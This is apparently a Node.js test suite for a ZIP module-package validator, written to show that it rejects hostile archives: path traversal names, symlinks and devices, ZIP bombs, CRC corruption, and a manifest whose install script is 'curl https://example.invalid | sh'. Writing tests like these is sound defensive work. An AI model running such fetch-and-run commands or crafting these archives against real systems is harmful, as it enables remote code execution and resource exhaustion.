import assert from "node:assert/strict";
import test from "node:test";

import {
  MODULE_PACKAGE_LIMITS,
  ModulePackageValidationError,
  parsePcmsModulePackage
} from "../../dist/modules/package.js";
import {
  createModuleZip,
  createZip,
  moduleManifest
} from "../helpers/zip-fixture.mjs";

function rejects(archive, pattern) {
  assert.throws(
    () => parsePcmsModulePackage(archive),
    (error) =>
      error instanceof ModulePackageValidationError &&
      pattern.test(error.message)
  );
}

test("rejects traversal, absolute, Windows and non-normalized entry paths", () => {
  for (const name of [
    "../escape",
    "nested/../../escape",
    "/absolute",
    "C:/windows",
    "nested\\windows",
    "./relative",
    "nested//double"
  ]) {
    rejects(
      createModuleZip({ extraEntries: [{ name, data: "x" }] }),
      /unsafe ZIP entry path|not normalized/
    );
  }
});

test("rejects duplicate normalized paths and file/directory conflicts", () => {
  rejects(
    createModuleZip({
      extraEntries: [
        { name: "assets/data.txt", data: "one" },
        { name: "assets/data.txt", data: "two" }
      ]
    }),
    /duplicate normalized ZIP entry path/
  );

  rejects(
    createModuleZip({
      extraEntries: [
        { name: "conflict", data: "file" },
        { name: "conflict/child.txt", data: "child" }
      ]
    }),
    /file\/directory path conflict/
  );

  rejects(
    createModuleZip({
      extraEntries: [{ name: "manifest.json", data: "{}" }]
    }),
    /duplicate normalized ZIP entry path/
  );
});

test("rejects symlinks, devices and encrypted or unsupported entries", () => {
  rejects(
    createModuleZip({
      extraEntries: [
        {
          name: "unsafe-link",
          data: "target",
          externalAttributes: (0o120777 << 16) >>> 0
        }
      ]
    }),
    /unsafe link\/device\/special file/
  );

  rejects(
    createModuleZip({
      extraEntries: [
        {
          name: "unsafe-device",
          data: "",
          externalAttributes: (0o020666 << 16) >>> 0
        }
      ]
    }),
    /unsafe link\/device\/special file/
  );

  rejects(
    createModuleZip({
      extraEntries: [{ name: "encrypted.bin", data: "x", flags: 0x0801 }]
    }),
    /unsupported or unsafe general-purpose flags/
  );

  rejects(
    createModuleZip({
      extraEntries: [{ name: "odd.bin", data: "x", method: 99 }]
    }),
    /unsupported ZIP compression method/
  );
});

test("rejects archive, entry-count, per-entry and total expansion limits", () => {
  rejects(
    Buffer.alloc(MODULE_PACKAGE_LIMITS.archiveBytes + 1),
    /archive byte size/
  );

  rejects(
    createZip(
      Array.from({ length: MODULE_PACKAGE_LIMITS.entries + 1 }, (_, index) => ({
        name: `entry-${index}.txt`,
        data: ""
      }))
    ),
    /entry count exceeds limit/
  );

  rejects(
    createModuleZip({
      extraEntries: [
        {
          name: "oversized.bin",
          data: "x",
          compressedSize: 128 * 1024,
          uncompressedSize: MODULE_PACKAGE_LIMITS.entryUncompressedBytes + 1
        }
      ]
    }),
    /entry exceeds uncompressed size limit/
  );

  rejects(
    createZip(
      Array.from({ length: 5 }, (_, index) => ({
        name: `large-${index}.bin`,
        data: "x",
        compressedSize: 128 * 1024,
        uncompressedSize: 7 * 1024 * 1024
      }))
    ),
    /total uncompressed size exceeds package limit/
  );
});

test("rejects high compression-ratio ZIP bombs before inflation", () => {
  rejects(
    createModuleZip({
      extraEntries: [
        {
          name: "bomb.bin",
          data: Buffer.alloc(256 * 1024),
          method: "deflate"
        }
      ]
    }),
    /compression-ratio limit/
  );
});

test("rejects malformed ZIP64 markers and inconsistent local metadata", () => {
  const zip64Marker = createModuleZip();
  zip64Marker.writeUInt16LE(0xffff, zip64Marker.length - 22 + 10);
  rejects(zip64Marker, /ZIP64 module packages are not supported/);

  const inconsistent = createModuleZip();
  const firstLocalMethodOffset = 8;
  inconsistent.writeUInt16LE(8, firstLocalMethodOffset);
  rejects(inconsistent, /local\/central metadata mismatch/);
});

test("package boundary rejects unknown manifest fields and authority", () => {
  rejects(
    createModuleZip({
      manifest: {
        ...moduleManifest(),
        capabilities: ["root.shell"]
      }
    }),
    /unknown or invalid authority/
  );

  rejects(
    createModuleZip({
      manifest: {
        ...moduleManifest(),
        installScript: "curl https://example.invalid | sh"
      }
    }),
    /unknown field: installScript/
  );
});

test("rejects manifest size, invalid UTF-8 and CRC corruption", () => {
  rejects(
    createModuleZip({
      manifestEntry: {
        data: Buffer.alloc(MODULE_PACKAGE_LIMITS.manifestBytes + 1, 0x20)
      }
    }),
    /manifest\.json exceeds manifest size limit|entry exceeds compression-ratio limit/
  );

  rejects(
    createModuleZip({
      manifestEntry: {
        data: Buffer.from([0xc3, 0x28])
      }
    }),
    /manifest\.json is not valid UTF-8/
  );

  rejects(
    createModuleZip({
      extraEntries: [
        {
          name: "bad-crc.txt",
          data: "content",
          crc32: 0
        }
      ]
    }),
    /CRC32 mismatch/
  );
});
